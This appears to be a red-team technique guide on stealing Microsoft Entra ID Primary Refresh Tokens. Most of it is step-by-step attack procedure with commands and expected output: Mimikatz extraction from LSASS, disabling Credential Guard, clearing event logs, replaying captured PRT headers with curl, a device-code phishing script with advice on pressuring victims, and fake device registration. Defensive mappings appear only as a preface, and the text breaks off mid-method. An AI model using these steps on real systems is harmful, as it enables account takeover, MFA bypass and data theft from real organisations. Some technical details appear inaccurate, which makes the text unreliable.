# [CA-TOKEN-012]: PRT Primary Refresh Token Attacks

## 1. Metadata Header

| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-012 |
| **MITRE ATT&CK v18.1** | [T1528: Steal Application Access Token](https://attack.mitre.org/techniques/T1528/) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID (Microsoft Entra ID joined, hybrid joined, or registered Windows devices) |
| **Severity** | Critical |
| **CVE** | CVE-2021-42287 (Kerberos PAC validation; related to privilege escalation in hybrid scenarios) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-08 |
| **Affected Versions** | Windows 10 (1903+), Windows 11, Windows Server 2016-2025, iOS, Android, macOS, Linux |
| **Patched In** | Ongoing mitigation via Token Protection Conditional Access, device compliance requirements, TPM enforcement |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

**Note:** Sections 6 (Atomic Red Team) and 8 (Splunk Detection) are partially applicable as no dedicated Atomic test exists for PRT extraction. Remaining sections apply to all supported environments.

---

## 2. Executive Summary

**Concept:** A Primary Refresh Token (PRT) is a high-privilege cryptographic artifact issued by Microsoft Entra ID to authenticate users on registered or managed devices. Unlike standard refresh tokens that are tied to specific applications, a PRT can be used to authenticate to any Entra ID-connected service, including Microsoft 365, Azure Portal, Teams, and SharePoint. Once an attacker obtains a PRT through credential dumping, browser session theft, or device registration abuse, they can bypass multi-factor authentication (MFA) and conditional access policies that rely solely on user credentials—not device identity. The attack is particularly dangerous because the compromised device often satisfies device-based conditional access policies, granting the attacker unrestricted access to cloud resources.

**Attack Surface:** The attack surface encompasses LSASS process memory (where PRT and session keys reside), browser HTTP headers (x-ms-RefreshTokenCredential), Trusted Platform Module (TPM) key material, device registration endpoints, and cloud-side PRT validation logic.

**Business Impact:** **Immediate cloud-wide compromise with MFA bypass.** An attacker with a stolen PRT can impersonate any Entra ID user on any cloud service without requiring a password or second factor. This enables exfiltration of sensitive data from Exchange, SharePoint, and OneDrive; account takeover in Microsoft 365 admin centers; deployment of persistent backdoors via Azure Automation or Logic Apps; and lateral movement to on-premises systems via hybrid identity sync abuse.

**Technical Context:** PRT extraction typically takes seconds to minutes on a compromised device. Stealth depends on method: LSASS memory dumping is highly detectable (antivirus flags, event logging); browser SSO cookie theft is low-noise. Once obtained, the PRT is valid for ~90 days and continuously renewed, allowing long-term persistence. Detection relies on identifying anomalous token flows, device-to-cloud transitions, or rapid device registration followed by immediate resource access.

### Operational Risk

- **Execution Risk:** Medium. Requires either local admin access (for LSASS dumping) or user-level code execution (for browser theft). Physical access to device is not required.
- **Stealth:** Low when using Mimikatz (event logging, antivirus detection). Medium when exploiting browser SSO cookies (minimal event noise). High when combining device code phishing with PRT upgrade (appears as legitimate authentication).
- **Reversibility:** No. A stolen PRT cannot be "un-stolen." Remediation requires full device revocation, PRT session revocation, and forced re-authentication. Compromised accounts require password reset and MFA re-enrollment.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1 Access Control | Inadequate device compliance policies fail to enforce hardware-backed credential storage (TPM), allowing PRT extraction from non-compliant endpoints. |
| **DISA STIG** | WN10-00-000030 | Weak authentication mechanisms fail to prevent credential theft; STIG requires credential guard and TPM enablement. |
| **CISA SCuBA** | MS.CIAAE.01 | Conditional Access policies must enforce device compliance and block legacy authentication; failure allows PRT abuse. |
| **NIST 800-53** | AC-3 Access Enforcement, SC-12 Cryptographic Key Management | Inadequate access controls and cryptographic key protection mechanisms enable unauthorized token acquisition and use. |
| **GDPR** | Art. 32 Security of Processing | Failure to implement appropriate technical measures (device hardening, encryption, access controls) to protect personal data stored in cloud services accessed via stolen PRT. |
| **DORA** | Art. 9 Protection and Prevention | Financial services must implement multi-layered authentication and device-binding controls to prevent unauthorized access to financial systems via PRT abuse. |
| **NIS2** | Art. 21 Cyber Risk Management Measures | Critical infrastructure operators must detect and respond to token theft and implement device-level protections (TPM, secure enclave, compliance policies). |
| **ISO 27001** | A.9.2.3 Management of Privileged Access Rights, A.10.1.1 Cryptographic Controls | Inadequate control of highly privileged tokens (PRTs) and failure to protect cryptographic keys bound to devices. |
| **ISO 27005** | Risk Scenario: Unauthorized Access via Compromised Device Authentication | Token theft from device authentication mechanisms represents a critical risk to confidentiality and availability of cloud-based assets. |

---

## 3. Technical Prerequisites

**Required Privileges:**
- **For LSASS memory extraction (Mimikatz):** Local Administrator or SYSTEM on the target device.
- **For browser SSO cookie theft:** Any user-level code execution in browser context (e.g., browser extension, XSS in trusted site, local process injection).
- **For device registration + PRT upgrade (ROADtx):** User credentials (username/password or device code). MFA may be required depending on Conditional Access policies.
- **For TPM key abuse:** Administrator privileges to interact with TPM or undocumented crypto APIs.

**Required Access:**
- Network access to Entra ID endpoints (login.microsoftonline.com, graph.microsoft.com).
- (Optional) Physical or remote access to a device with Windows Secure Boot and TPM (for direct key extraction).

**Supported Versions:**
- **Windows:** Windows 10 (1903+), Windows 11, Windows Server 2016, 2019, 2022, 2025
- **Cloud Platforms:** Entra ID (Azure Active Directory), Entra hybrid joined scenarios, ADFS federated environments
- **Other OS:** iOS, Android, macOS (Platform SSO), Linux (with Broker)
- **PowerShell:** Version 5.0+ (for token manipulation scripts)
- **Mimikatz:** Version 2.2.0 (20200807) or later for CloudAP module support

**Tools:**
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Version 2.2.0+) – LSASS memory dumping and token extraction.
- [ROADtx (ROADtools Token eXchange)](https://github.com/dirkjanm/ROADtools) – Device registration and PRT token manipulation.
- [AADInternals](https://aadinternals.com/) – PowerShell module for PRT key extraction and token generation.
- [RequestAADRefreshToken.exe](https://github.com/leechristensen/RequestAADRefreshToken) – PRT extraction from browser without tools.
- [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec) – Remote credential dumping via SMB.
- [Browser DevTools](https://developer.mozilla.org/en-US/docs/Tools) – Network traffic inspection for SSO cookie capture.

---

## 4. Environmental Reconnaissance

### Step 1: Identify Entra ID-Joined or Registered Devices

**Objective:** Determine if the target device is registered with Entra ID and capable of issuing PRTs.

**Command (Windows - PowerShell):**
```powershell
dsregcmd /status
```

**Expected Output:**
```
+----------------------------------------------------------------------+
| Device State                                                         |
+----------------------------------------------------------------------+
AzureAdJoined : YES                              # Device is Entra-joined
EnterpriseJoined : NO
DomainJoined : YES                               # Hybrid-joined (both AD and Entra)
Device Name : DESKTOP-ABC123
...
+----------------------------------------------------------------------+
| SSO State                                                            |
+----------------------------------------------------------------------+
AzureAdPrt : YES                                 # PRT is available
AzureAdPrtUpdateTime : 2025-01-08 10:30:00 UTC  # Last renewal time
...
```

**What to Look For:**
- `AzureAdJoined : YES` or `EnterpriseJoined : YES` indicates the device is registered and can issue PRTs.
- `AzureAdPrt : YES` confirms a valid PRT is currently stored and accessible.
- If `AzureAdPrt : NO`, the device is not yet fully authenticated to Entra ID (possible exploitation scenario if user re-authentication occurs).

**OpSec Note:** This command generates minimal event logging and is safe to run on target devices during reconnaissance.

---

### Step 2: Check TPM Status (Device Protection Level)

**Objective:** Assess whether the PRT is protected by TPM (hardware-backed) or stored in software.

**Command (Windows - PowerShell):**
```powershell
Get-WmiObject -Namespace root\cimv2\security\microsoftvolumeencryption -Class Win32_EncryptableVolume | Select-Object -Property driveletter,ProtectionStatus

# Check TPM presence and firmware version
Get-WmiObject -Namespace root\cimv2 -Class Win32_Tpm
```

**Expected Output (TPM Present):**
```
Status : 2                                       # TPM is ready
IsActivated() : True
IsEnabled() : True
ManufacturerId : 0x1014                          # Intel TPM
SpecVersion : 2.0                                # TPM 2.0
```

**Expected Output (TPM Absent or Disabled):**
```
# Empty result or "No instance(s) available"
# High-risk scenario: PRT stored in software without hardware protection
```

**What to Look For:**
- **TPM 2.0 Present & Enabled:** PRT is cryptographically bound to device; key extraction requires admin + undocumented APIs.
- **TPM 1.2 or Disabled:** PRT protected only by software encryption; easier to extract via memory dumps or DPAPI attacks.
- **No TPM:** PRT stored in plaintext or weak encryption; highest risk of theft.

**Version Note:** Windows 11 requires TPM 2.0. Windows 10 may fall back to software protection if TPM fails.

---

### Step 3: Enumerate Cloud Applications and Conditional Access Policies

**Objective:** Understand which cloud services are accessible via the stolen PRT and whether device-based Conditional Access is enforced.

**Command (Azure CLI - Entra ID-joined device with user credentials):**
```bash
az login
az ad app list --filter "appId eq '00000002-0000-0000-c000-000000000000'" # Azure Service Management
az ad sp list --filter "appDisplayName eq 'Microsoft Graph'" # Microsoft Graph API
```

**Command (PowerShell - Using existing token):**
```powershell
Connect-MgGraph
Get-MgContext | Select-Object -Property TenantId, Account, Scopes
```

**What to Look For:**
- List of OAuth applications the user has authorized (consent grants).
- Service principals with elevated roles (Owner, Global Admin).
- Delegated permissions (Scope) that a PRT can be used to request.

**OpSec Note:** These commands may generate sign-in audit events in Azure if not using cached credentials.

---

## 5. Detailed Execution Methods

### METHOD 1: LSASS Memory Extraction via Mimikatz (Local Admin Required)

**Supported Versions:** Windows 10 (1903+), Windows 11, Server 2016-2025

#### Step 1: Gain Local Administrator Access

**Objective:** Obtain local admin privileges on the target device.

**Prerequisites:**
- Already have administrative access via RDP, physical console, UAC bypass, or privilege escalation exploit.

**Version Note:** On Windows 10/11 with User Account Control (UAC), privilege escalation may require token impersonation or UAC bypass techniques (e.g., COM hijacking, token impersonation via PrintSpooler).

**OpSec & Evasion:**
- Running Mimikatz as non-admin will fail with "ERROR in kuhl_m_sekurlsa_acquireHandle(): GetProcessHandle() KO.".
- Consider using **Credential Guard** bypass techniques if enabled (requires kernel-level exploit).
- Mimikatz binary is heavily detected by EDR/AV; consider obfuscated or in-memory variants (e.g., Invoke-Mimikatz PowerShell).

**Troubleshooting:**
- **Error:** "GetProcessHandle() KO": Insufficient privileges. Re-run as admin.
- **Error:** "Credential Guard enabled": Use kernel exploit or KinderGarten technique.
- **Fix (Server 2016-2019):** Disable Credential Guard via Group Policy if control is available: `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\LsaCfgFlags` = 0.
- **Fix (Server 2022+):** Credential Guard cannot be easily disabled; pivot to alternative extraction (see METHOD 2).

**References:**
- [Microsoft Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage)
- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)

---

#### Step 2: Execute Mimikatz sekurlsa::cloudap Module

**Objective:** Extract the PRT, session key, and device credentials from LSASS process memory.

**Command (Mimikatz Interactive):**
```cmd
mimikatz.exe
mimikatz # privilege::debug                    # Escalate to DEBUG privilege
mimikatz # sekurlsa::cloudap                   # Extract CloudAP module data (PRT)
```

**Command (Mimikatz One-Liner):**
```cmd
mimikatz.exe "privilege::debug" "sekurlsa::cloudap" "exit" > prt_dump.txt
```

**Expected Output:**
```
CloudAP : TID 0x8a4 (2212)

  * Key : {version:1, cryptoProvider:1, ...}
    * PRT         : eyJhbGciOiJSUzI1NiIsImtpZCI6IjEifQ.eyJ... [JWT Token]
    * Key Version : 2
    * Resource    : https://login.microsoftonline.com
    * Claims      : {...}
    * Device Key  : RSA-2048 [exponent=65537, modulus=...]
    * Transport Key: RSA-2048 [exponent=65537, modulus=...]
    * Session Key : [256-bit symmetric key]
```

**What This Means:**
- **PRT (JWT):** Base64-encoded JWT token containing user identity, device claims, and MFA status.
- **Session Key:** 256-bit symmetric key used to sign PRT requests to Entra ID (Proof-of-Possession).
- **Device Key / Transport Key:** RSA keys used during PRT issuance and renewal (protected by TPM if available).

**Version Note:**
- **Windows 10 (1903-1909):** CloudAP stores PRT in DPAPI-encrypted format; Mimikatz can decrypt if running as SYSTEM or user context.
- **Windows 10 (2004+) / Windows 11:** PRT may be protected by TPM; Mimikatz can still extract if TPM is disabled or not actively protecting the key.
- **Server 2022+:** Credential Guard enabled by default; Mimikatz may fail unless running in specialized mode or kernel exploit available.

**OpSec & Evasion:**
- **Detection Likelihood: Very High.** Antivirus will flag Mimikatz binary; EDR will alert on LSASS access.
- **Mitigation:** Use obfuscated/renamed Mimikatz binary, run from RAM without disk writes, or use alternate tools (SafetyKatz, DumpAADUserRPT).
- **Log Evasion:** Clear Security event log post-execution (Event ID 4688 - Process Creation, 4689 - Process Termination).

**Troubleshooting:**
- **Error:** "sekurlsa::cloudap: unknown command": Mimikatz version < 2.2.0. Update to latest release.
- **Error:** "ERROR in kuhl_m_sekurlsa_acquireHandle()": LSASS is protected or Credential Guard enabled. Use kernel privilege or alternative method.
- **Error:** "No CloudAP data found": Device is not Entra-joined. Verify `dsregcmd /status` shows `AzureAdJoined : YES`.
- **Fix (Windows 11):** Disable Credential Guard (requires reboot and admin): `reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "LsaCfgFlags" /t REG_DWORD /d 0 /f`

**References:**
- [Mimikatz CloudAP Module](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa)
- [Windows 10 Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage)
- [Digging further into the Primary Refresh Token - Dirk-jan Mollema](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)

---

#### Step 3: Extract and Decode JWT Components

**Objective:** Parse the PRT JWT and extract usable claims (user ID, device ID, MFA status).

**Command (PowerShell - JWT Decoding):**
```powershell
# Decode JWT header and payload (not signature verification)
$prt = "eyJhbGciOiJSUzI1NiIsImtpZCI6IjEifQ.eyJ..." # From Mimikatz output

$parts = $prt.Split('.')
$header = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($parts[0]))
$payload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($parts[1]))

Write-Host "Header: $header"
Write-Host "Payload: $payload" | ConvertFrom-Json
```

**Expected Payload Structure:**
```json
{
  "aud": "https://login.microsoftonline.com",
  "iss": "https://login.microsoftonline.com/{tenantid}/",
  "iat": 1641234567,
  "nbf": 1641234567,
  "exp": 1641321000,
  "sub": "user@domain.com",
  "device_id": "12a34b56-c789-1234-d567-890abcdef012",
  "amr": ["ngcmfa"],           # Contains "ngcmfa" if Windows Hello for Business used
  "mfa_auth_time": 1641234567,
  "mfa": "1",                  # "1" = MFA passed; "0" = no MFA
  "win_ver": "10.0.22621.1234",
  "x_client_platform": "Windows"
}
```

**What This Means:**
- **sub:** User principal name (UPN). Used to identify target account.
- **device_id:** Unique Entra ID device identifier. Conditional Access may validate against this.
- **mfa:** "1" = PRT obtained with MFA; can bypass MFA checks. "0" = no MFA; some policies may reject.
- **amr (Authentication Method Reference):** "ngcmfa" indicates Windows Hello for Business; highest trust.

**OpSec & Evasion:** Decoding does not generate logs but may be flagged by logging tools if performed on target. Safe to perform offline on attacker machine.

**References:**
- [JWT.io Debugger](https://jwt.io/)
- [Microsoft Entra Token Claims](https://learn.microsoft.com/en-us/entra/identity-platform/access-tokens)

---

#### Step 4: Replay PRT to Access Cloud Services

**Objective:** Use stolen PRT + session key to authenticate to Entra ID services without requiring MFA or device compliance re-verification.

**Command (Using ROADtx - PRT Replay):**
```bash
# First, save the PRT and session key to a file (from Mimikatz output)
# prt.json format: {"prt": "eyJ...", "key": "base64_session_key", "device_id": "..."}

roadtx prtauth -prt prt.json -url "https://graph.microsoft.com" -o output_token.json
```

**Command (Using Browser Method - Manual Replay):**
```javascript
// In browser console (Edge/Chrome Dev Tools):
// Step 1: Open DevTools → Network tab
// Step 2: Browse to https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?...
// Step 3: Capture the request header "x-ms-RefreshTokenCredential"
// Step 4: Save the value to a file and use in curl:

curl -H "x-ms-RefreshTokenCredential: eyJ..." \
     -H "x-ms-DeviceCredential: eyJ..." \
     -H "User-Agent: Mozilla/5.0" \
     "https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?client_id=1950a258-227b-4e31-a9cf-717495945fc2&redirect_uri=..." \
     -v
```

**Expected Success Response:**
```
HTTP/1.1 302 Found
Location: https://myapps.microsoft.com/?...
Set-Cookie: x-ms-session=eyJ...; secure; httponly
```

**What This Means:**
- **302 Redirect:** Authentication succeeded; user is now in authenticated session.
- **x-ms-session cookie:** Session cookie bound to device; can be used for subsequent requests.
- **Success indicates:** Entra ID accepted the PRT as valid proof of device and user identity.

**OpSec & Evasion:**
- **Detection Likelihood: Medium.** PRT replay from different IP or user agent may trigger anomaly detection.
- **Mitigation:** Spoof User-Agent to match original device; use same network/IP range if possible.
- **Time Window:** PRT is valid for ~90 days; session key is short-lived (use within 5 minutes of extraction).

**Troubleshooting:**
- **Error 400 Bad Request**: Session key has expired. Extract fresh PRT from LSASS.
- **Error 401 Unauthorized**: PRT has been revoked or invalidated. Device may have been quarantined.
- **Error 403 Forbidden**: Conditional Access policy blocked access (device not compliant, location, etc.). Try from different network/device.
- **Fix:** Ensure PRT was extracted within the last 5 minutes. Refresh session key using Method 2 (browser extraction) if available.

**References:**
- [ROADtx GitHub - prtauth Command](https://github.com/dirkjanm/ROADtools)
- [Primary Refresh Token Exploitation - Pulse Security](https://pulsesecurity.co.nz/articles/exploiting-entraid-prt)

---

### METHOD 2: Browser SSO Cookie Theft via Developer Tools (No Admin Required)

**Supported Versions:** Windows 10/11, Chrome, Edge, Firefox

#### Step 1: Identify Browser with Active PRT Session

**Objective:** Locate a browser that has already obtained and cached a PRT (e.g., user is logged into Office 365).

**Command (PowerShell - List Browser Processes):**
```powershell
Get-Process | Where-Object { $_.ProcessName -like "chrome*" -or $_.ProcessName -like "msedge*" -or $_.ProcessName -like "firefox*" }
```

**Expected Output:**
```
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
  1234     234    234567     123456      1.23   5678   2 msedge
```

**What to Look For:**
- Active browser process with significant memory (WS(K) > 100000).
- User is already logged into Microsoft 365 or Outlook (PRT cache exists).

**OpSec & Evasion:** Browser detection is silent and does not generate alerts.

---

#### Step 2: Open Browser Developer Tools and Inspect Network Traffic

**Objective:** Capture the `x-ms-RefreshTokenCredential` header containing the PRT cookie.

**Manual Steps (Microsoft Edge / Chrome):**
1. Open browser where user is logged into Microsoft 365 or Outlook.
2. Press **F12** or right-click → **Inspect** to open Developer Tools.
3. Navigate to **Network** tab.
4. In the address bar, type: `https://mysignins.microsoft.com` or `https://portal.office.com` and press Enter.
5. In the Network tab, look for a request to `login.microsoftonline.com` or similar.
6. Click on the request to view **Request Headers**.
7. Find header named **`x-ms-RefreshTokenCredential`** (may also appear as `x-ms-RefeshTokenCredential`).
8. Copy the entire header value (JWT token).
9. Also capture **`x-ms-DeviceCredential`** header if present.

**Browser Console Alternative (JavaScript):**
```javascript
// Open console (F12 → Console tab) and paste:
window.location = "https://mysignins.microsoft.com";

// Wait for redirect, then in the redirected page console:
// Check Network tab for "x-ms-RefreshTokenCredential" header
// Or use fetch API to capture headers:
fetch('https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?client_id=1950a258-227b-4e31-a9cf-717495945fc2&redirect_uri=https://mysignins.microsoft.com', {
  method: 'GET',
  credentials: 'include'  // Include cookies
}).then(r => r.headers).then(h => console.log(h.get('x-ms-RefreshTokenCredential')));
```

**Expected Output:**
```
x-ms-RefreshTokenCredential: eyJhbGciOiJSUzI1NiIsImtpZCI6IjEifQ.eyJpc19wcmltYXJ5IjoiYmV0dXJ...
x-ms-DeviceCredential: eyJhbGciOiJSUzI1NiIsImtpZCI6IjIifQ.eyJpc19wcmltYXJ5IjoiYmV0dXJ...
```

**What This Means:**
- **x-ms-RefreshTokenCredential:** PRT JWT signed by device session key.
- **x-ms-DeviceCredential:** Device proof-of-possession header (device key signature).

**Version Note:**
- **Edge (Chromium-based):** Native support for PRT injection; headers visible in Network tab.
- **Chrome:** Requires "Windows 10 Accounts" extension for PRT injection.
- **Firefox v91+:** Requires "Windows SSO" flag enabled in about:config.

**OpSec & Evasion:**
- **Detection Likelihood: Low.** DevTools inspection generates no system events.
- **Mitigation:** Can be detected by browser telemetry or EDR that monitors console output.
- **Time Window:** Headers are fresh; use immediately within 5-10 minutes.

**Troubleshooting:**
- **Error:** "No x-ms-RefreshTokenCredential header": User not logged in or device not Entra-joined. Try logging in to Office 365 first.
- **Error:** "Header value is empty or malformed": Browser cache cleared. Perform login again.
- **Fix:** Ensure user has navigated to a Microsoft service (Outlook, Teams, SharePoint) before attempting capture.

**References:**
- [Browser SSO using PRT - Microsoft Learn](https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token#browser-sso-using-prt)
- [DevTools Network Tab - MDN Web Docs](https://developer.mozilla.org/en-US/docs/Tools/Network_Monitor)

---

#### Step 3: Replay PRT Cookie on Attacker Machine

**Objective:** Use captured PRT header to authenticate from a different device/IP address.

**Command (cURL - Manual Replay):**
```bash
# Set environment variables with captured headers
export PRT="eyJhbGciOiJSUzI1NiIsImtpZCI6IjEifQ.eyJ..."
export DEVICE="eyJhbGciOiJSUzI1NiIsImtpZCI6IjIifQ.eyJ..."

# Request OAuth token using PRT
curl -i \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  -H "x-ms-RefreshTokenCredential: $PRT" \
  -H "x-ms-DeviceCredential: $DEVICE" \
  "https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?client_id=1950a258-227b-4e31-a9cf-717495945fc2&redirect_uri=https%3A%2F%2Fmysignins.microsoft.com&response_type=code&scope=openid%20profile%20email&state=random123&nonce=random456"
```

**Expected Response:**
```
HTTP/1.1 302 Found
Location: https://mysignins.microsoft.com?code=M.R3_BAY...&state=random123
Set-Cookie: x-ms-session=eyJ...; secure; httponly; samesite=strict
```

**What This Means:**
- **302 with Location:** Entra ID authenticated the request and issued an auth code.
- **x-ms-session cookie:** New session established; use this for subsequent authenticated requests.

**Command (PowerShell - Extract Access Token):**
```powershell
# Using the auth code from the redirect URL:
$code = "M.R3_BAY..."
$body = @{
    client_id = "1950a258-227b-4e31-a9cf-717495945fc2"
    client_secret = ""                          # May be required depending on app
    code = $code
    grant_type = "authorization_code"
    redirect_uri = "https://mysignins.microsoft.com"
}

$response = Invoke-WebRequest -Uri "https://login.microsoftonline.com/organizations/oauth2/v2.0/token" `
                              -Method POST `
                              -Body ($body | ConvertTo-Json) `
                              -ContentType "application/json"

$accessToken = ($response.Content | ConvertFrom-Json).access_token

# Access Microsoft Graph API
$headers = @{ Authorization = "Bearer $accessToken" }
Invoke-WebRequest -Uri "https://graph.microsoft.com/v1.0/me" -Headers $headers
```

**Expected Output:**
```json
{
  "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#users/$entity",
  "id": "12345678-1234-1234-1234-123456789012",
  "userPrincipalName": "user@domain.com",
  "displayName": "Victim User",
  "mail": "user@domain.com"
}
```

**OpSec & Evasion:**
- **Detection Likelihood: Medium-High.** Multiple authentication requests from different IP/user agent trigger anomaly detections.
- **Mitigation:** Space requests over time; rotate user agents; use corporate proxy/VPN if possible.
- **Log Signature:** Look for "Unfamiliar sign-in properties" risk detection in Entra ID.

**Troubleshooting:**
- **Error 401 Unauthorized**: PRT has expired (valid for ~5 minutes). Extract fresh headers from browser.
- **Error 403 Forbidden**: Conditional Access policy blocks access from unregistered device.
- **Fix:** Re-extract headers from browser if expired. Use same IP range and user agent as original device.

**References:**
- [ROADtx browserprtauth Command](https://github.com/dirkjanm/ROADtools/wiki)
- [OAuth 2.0 Authorization Code Flow - Microsoft Learn](https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-auth-code-flow)

---

### METHOD 3: Device Registration + PRT Upgrade via ROADtx (Phishing Scenario)

**Supported Versions:** All Entra ID tenants (regardless of Windows version)

#### Step 1: Phish User Credentials via Device Code Flow

**Objective:** Obtain a valid user refresh token through device code phishing (no local access required).

**Command (ROADtx - Interactive Authentication):**
```bash
# Initiate device code flow
roadtx gettokens -u "https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode" \
                 --client-id "1950a258-227b-4e31-a9cf-717495945fc2" \
                 --output-file tokens.json

# Output will display:
# To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code AB12CD34EF56
# Once user authenticates on their device, tokens will be saved to tokens.json
```

**Alternative (Device Code Phishing Script):**
```python
# Python script to generate device code login URL and capture token
import requests
import json

client_id = "1950a258-227b-4e31-a9cf-717495945fc2"  # Azure PowerShell
tenant = "common"
device_code_url = f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode"

data = {
    "client_id": client_id,
    "scope": "https://graph.microsoft.com/.default"
}

response = requests.post(device_code_url, data=data)
device_code_data = response.json()

print(f"Visit: {device_code_data['verification_uri']}")
print(f"Enter code: {device_code_data['user_code']}")

# Poll for token once user authenticates
token_url = f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token"
while True:
    token_data = {
        "client_id": client_id,
        "device_code": device_code_data["device_code"],
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code"
    }
    response = requests.post(token_url, data=token_data)
    if "access_token" in response.json():
        tokens = response.json()
        print(f"Got tokens: {json.dumps(tokens, indent=2)}")
        break
```

**Expected Output:**
```json
{
  "access_token": "eyJ0eXAiOiJKV1QiL...",
  "refresh_token": "0.AWYAMEj_...",
  "expires_in": 3599,
  "token_type": "Bearer",
  "scope": "https://graph.microsoft.com/.default"
}
```

**What This Means:**
- **refresh_token:** Short-lived token bound to the "Azure PowerShell" client app (not a PRT yet).
- **access_token:** Can be used to make API calls as the authenticated user.

**Version Note:**
- Device code flow is available in all Entra ID tenants.
- Victim must actively enter the code on their device; phishing via social engineering is required.

**OpSec & Evasion:**
- **Detection Likelihood: Medium.** Device code flow from suspicious client app may trigger anomaly alerts.
- **Mitigation:** Use legitimate client IDs (Azure CLI, VS Code, etc.); add social engineering pretense (e.g., "Verify your identity for security update").

**Troubleshooting:**
- **Error:** "Client app not registered": Use well-known client IDs (Azure PowerShell: 1950a258-227b-4e31-a9cf-717495945fc2).
- **Error:** "User declined to authenticate": Victim did not complete the device code login. Resend phishing link.
- **Fix:** Use shorter, more convincing device codes; provide time limit to pressure victim into action.

**References:**
- [OAuth Device Code Flow - RFC 8628](https://tools.ietf.org/html/rfc8628)
- [ROADtx gettokens Command](https://github.com/dirkjanm/ROADtools/wiki/gettokens)
- [Device Code Phishing - Dirk-jan Mollema](https://dirkjanm.io/phishing-for-microsoft-entra-primary-refresh-tokens/)

---

#### Step 2: Register Fake Device in Entra ID

**Objective:** Use the obtained refresh token to register a new device and obtain a device certificate.

**Command (ROADtx - Device Registration):**
```bash
# Register a new device using the refresh token
roadtx deviceregister -t tokens.json \
                      --device-name "CORP-LAPTOP-ABC" \
                      --device-type "Windows10" \
                      --os-version "10.0.22621" \
                      --output-file device.json

# Output will contain:
# Device ID: 12a34b56-c789-1234-d567-890abcdef012
# Device Certificate: -----BEGIN CERTIFICATE-----
# Device Key: -----BEGIN PRIVATE KEY-----
```

**Expected Output (device.json):**
```json
{
  "device_id": "12a34b56-c789-1234-d567-890abcdef012",
  "device_name": "CORP-LAPTOP-ABC",
  "device_certificate": "-----BEGIN CERTIFICATE-----\nMIID...\n-----END CERTIFICATE-----",
  "device_key": "-----BEGIN PRIVATE KEY-----\nMIIE...\n-----END PRIVATE KEY-----",
  "refresh_token": "0.AXYA..."
}
```

**What This Means:**
- **device_id:** Unique Entra ID identifier for the fake device (used in tokens).
- **device_certificate + device_key:** Cryptographic credentials that prove device authenticity.
- **refresh_token:** Updated token bound to the new device (not yet a PRT).

**Version Note:**
- Device registration works in all tenant configurations (no special policies required).
- Device compliance checks may fail unless device is enrolled in Intune (see METHOD 4).

**OpSec & Evasion:**
- **Detection Likelihood: Low-Medium.** Device registration appears as legitimate device onboarding.
- **Mitigation:** Use believable device names (e.g., CORP-LAPTOP-ABC instead of ATTACKER-PC).
- **Indicators:** New device with no login history, immediate token requests from different IP.

**Troubleshooting:**
- **Error:** "Device registration service unreachable": Network connectivity issue. Check internet access.
- **Error:** "Device limit exceeded": Tenant has a limit on registered devices. Unregister old devices first.
- **Fix:** Use https://myprofile.microsoft.com to view and manage registered devices.

**References:**
- [Device Registration Service API](https://learn.microsoft.com/en-us/entra/identity/devices/concept-device-registration)
- [ROADtx deviceregister Command](https://github.com/dirkjanm/ROADtools/wiki/deviceregister)

---

#### Step 3: Request PRT from Registered Device

**Objective:** Use the device certificate to request a Primary Refresh Token.

**Command (ROADtx - PRT Request):**
```bash
# Request a PRT using the device certificate and original refresh token
roadtx prt -u "user@domain.com" \
           -r "0.AXYA..." \
           --key device_key.pem \
           --cert device_cert.pem \
           --output-file prt_keys.json

# Or using password (if available):
roadtx prt -u "user@domain.com" \
           -p "P@ssw0rd123" \
           --key device_key.pem \
           --cert device_cert.pem \
           --output-file prt_keys.json
```

**Expected Output (prt_keys.json):**
```json
{
  "prt": "eyJhbGciOiJSUzI1NiIsImtpZCI6IjEifQ.eyJ...",
  "key_data": {
    "type": "symmetric",
    "alg": "A256CBC-HS512",
    "value": "base64_encoded_session_key"
  },
  "refresh_token": "0.AXYA...",
  "device_id": "12a34b56-c789-1234-d567-890abcdef012"
}
```

**What This Means:**
- **prt:** Primary Refresh Token (JWT) bound to the fake device and user.
- **key_data:** Session key (proof-of-possession) for signing subsequent requests.
- **refresh_token:** Updated refresh token valid until the PRT expires (~90 days).

**Version Note:**
- PRT is issued regardless of device compliance status during this phase.
- Device compliance is checked later when using the PRT for resource access.

**OpSec & Evasion:**
- **Detection Likelihood: Medium.** PRT issuance to a newly registered device is suspicious.
- **Mitigation:** Space device registration and PRT requests over time if possible.
- **Indicators:** New device immediately requesting PRT from different IP.

**Troubleshooting:**
- **Error:** "Invalid device certificate": Certificate was not properly extracted. Rerun device registration.
- **Error:** "User credentials invalid": Refresh token has expired. Rerun device registration with fresh token.
- **Fix:** Keep device registration and PRT request within 1 hour to avoid token expiration.

